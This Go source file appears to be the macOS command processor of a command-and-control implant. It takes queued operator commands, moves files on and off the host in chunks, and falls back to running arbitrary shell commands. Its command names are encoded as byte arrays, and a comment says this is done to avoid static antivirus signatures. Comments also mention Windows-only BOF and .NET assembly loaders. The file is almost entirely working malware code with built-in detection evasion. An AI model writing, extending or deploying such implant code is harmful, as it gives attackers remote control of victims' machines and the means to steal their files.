// server/docker/payloads/Darwin/command_processor.go

//go:build darwin
// +build darwin

package main

import (
	"fmt"
	"strings"
	"time"
)

// Command processor strings (constructed to avoid static signatures)
// NOTE: inline-assembly and bof commands are Windows-only (.NET CLR / BOF loader)
// They are not supported on Linux/Darwin builds
var (
	// Command names (Darwin-supported only)
	cpCmdUpload   = string([]byte{0x75, 0x70, 0x6c, 0x6f, 0x61, 0x64})         // upload
	cpCmdDownload = string([]byte{0x64, 0x6f, 0x77, 0x6e, 0x6c, 0x6f, 0x61, 0x64}) // download
)

// ProcessNextCommand processes the next command in the queue
func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
	cq.mu.Lock()
	if len(cq.commands) == 0 {
		cq.mu.Unlock()
		return nil, nil
	}

	cmd := cq.commands[0]
	cq.commands = cq.commands[1:]
	cq.mu.Unlock()

	// Set the current command in context
	cq.cmdContext.mu.Lock()
	cq.cmdContext.CurrentCommand = &cmd
	cq.cmdContext.mu.Unlock()

	// IMPORTANT: Apply session environment variables before executing any command
	cq.applySessionEnvironment()

	// NOTE: inline-assembly and bof commands are Windows-only (.NET CLR / BOF loader)
	// They are not supported on Linux/Darwin builds - no handlers registered

	// Handle upload chunks
	if cmd.Command == cpCmdUpload && cmd.Data != "" {
		result, err := HandleUploadChunk(cmd, cq.cmdContext)
		if err != nil {
			return &CommandResult{
				Command:     cmd,
				Error:       err,
				ErrorString: err.Error(),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}
		return result, nil
	}

	// Handle download continuation
	if cmd.Filename != "" && cmd.CurrentChunk > 0 {

		cq.mu.Lock()
		downloadInfo, exists := cq.activeDownloads[cmd.Filename]
		cq.mu.Unlock()

		if !exists {
			return &CommandResult{
				Command:     cmd,
				Error:       fmt.Errorf(Err(E4)),
				ErrorString: Err(E4),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}

		if !downloadInfo.InProgress {
			return &CommandResult{
				Command:     cmd,
				Error:       fmt.Errorf(Err(E4)),
				ErrorString: Err(E4),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}

		result, err := GetNextFileChunk(downloadInfo.FilePath, cmd.CurrentChunk, cmd)
		if err != nil {
			return &CommandResult{
				Command:     cmd,
				Error:       err,
				ErrorString: err.Error(),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}

		cq.UpdateDownloadProgress(cmd.Filename, cmd.CurrentChunk)

		return result, nil
	}

	// Parse command for everything else
	// NOTE: BOF commands are Windows-only and not supported on Linux/Darwin builds

	// Special handling for download and upload commands to preserve spaces in file paths
	var args []string
	cmdLower := strings.ToLower(strings.TrimSpace(cmd.Command))

	if strings.HasPrefix(cmdLower, cpCmdDownload) {
		// Use special parsing for download that treats everything after "download" as one argument
		args = parseDownloadCommand(cmd.Command)
	} else if strings.HasPrefix(cmdLower, cpCmdUpload) {
		// Use special parsing for upload that treats everything after "upload" as one argument
		args = parseUploadCommand(cmd.Command)
	} else {
		// Use improved general parser for all other commands
		args = parseCommandLine(cmd.Command)
	}

	if len(args) == 0 {
		return &CommandResult{
			Command:     cmd,
			Error:       fmt.Errorf(Err(E1)),
			ErrorString: Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}, nil
	}
	// args[0] is the command name (already identified by CommandType)
	cmdArgs := args[1:]

	// Look up command handler by numeric ID
	if handler, exists := cq.cmdHandlers[cmd.CommandType]; exists {
		result := handler(cq.cmdContext, cmdArgs)

		// For file operations (download/upload), preserve the data from the handler
		if (cmd.CommandType == CmdDownload || cmd.CommandType == CmdUpload) &&
			(result.Command.Filename != "" || result.Command.Data != "") {
			// The handler set file operation data, merge with original command metadata
			result.Command.CommandID = cmd.CommandID
			result.Command.CommandDBID = cmd.CommandDBID
			result.Command.AgentID = cmd.AgentID
			result.Command.Timestamp = cmd.Timestamp
			// Keep the file data from the handler (Filename, CurrentChunk, TotalChunks, Data)
		} else {
			// For non-file operations, use the original command
			result.Command = cmd
		}

		result.CompletedAt = time.Now().Format(time.RFC3339)
		return &result, nil
	}

	// If no handler found (CommandType == CmdUnknown or unregistered), try shell command
	output, err := executeShellCommand(cmd.Command)
	if err != nil {
		return &CommandResult{
			Command:     cmd,
			Output:      output,
			Error:       err,
			ErrorString: err.Error(),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}, nil
	}

	return &CommandResult{
		Command:     cmd,
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}, nil
}
